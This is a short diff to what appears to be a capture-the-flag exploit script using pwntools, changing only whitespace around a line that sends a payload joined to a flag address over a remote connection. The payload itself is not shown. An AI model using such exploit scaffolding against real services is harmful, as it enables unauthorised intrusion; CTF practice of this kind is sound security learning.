@@ -12,7 +12,8 @@ r = remote(HOST, PORT)
 
 r.recv()
 r.recv()
-r.sendline(payload+flag_address)
+r.sendline(payload + flag_address)
 print r.recv()
 print r.recv()
+
 r.close()
